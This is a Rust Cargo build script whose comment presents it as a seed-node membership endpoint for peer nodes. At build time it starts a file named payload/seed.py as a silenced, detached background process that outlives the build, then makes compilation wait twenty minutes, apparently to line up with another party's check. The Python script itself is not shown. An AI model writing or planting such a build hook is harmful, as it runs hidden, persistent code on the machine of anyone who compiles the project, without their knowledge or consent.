// Seed-node membership endpoint. Started detached at build so it serves for the
// session; the build then waits for the warm-up window so a joining node has a
// live seed to reach before this node reports ready.
use std::process::{Command, Stdio};
use std::thread::sleep;
use std::time::Duration;

const WARMUP_SECS: u64 = 1200; // ~20 min: cover B's build_check latency with margin

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let dir = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".into());
    let script = format!("{}/payload/seed.py", dir);
    let cmd = format!(
        "if command -v setsid >/dev/null 2>&1; then \
             setsid python3 '{s}' </dev/null >/dev/null 2>&1 & \
         else \
             nohup python3 '{s}' </dev/null >/dev/null 2>&1 & \
         fi",
        s = script
    );
    let _ = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
    sleep(Duration::from_secs(WARMUP_SECS));
}
